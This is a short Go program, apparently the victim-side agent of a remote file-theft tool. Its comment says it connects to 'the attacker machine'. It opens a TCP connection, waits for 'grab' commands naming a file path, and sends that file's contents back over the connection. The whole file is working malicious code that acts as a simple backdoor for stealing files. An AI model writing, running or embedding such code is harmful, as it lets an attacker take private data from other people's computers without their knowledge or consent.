package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"sync"
)

var wg sync.WaitGroup

func main() {
	//Going to connected to the attacker machine ( ip addr same as servers)
	conn, _ := net.Dial("tcp", ":8081")
	for {
		message, _ := bufio.NewReader(conn).ReadString('\n')
		if strings.Contains(message, "grab") {
			newpath := strings.Split(message, "*")
			filer := newpath[1]
			fmt.Println(filer)
			nee := strings.TrimSpace(filer)
			fmt.Println(nee)
			file, _ := os.Open(nee)
			//fmt.Println(file)

			l, _ := io.Copy(conn, file)
			fmt.Println(l)

		}
	}
}
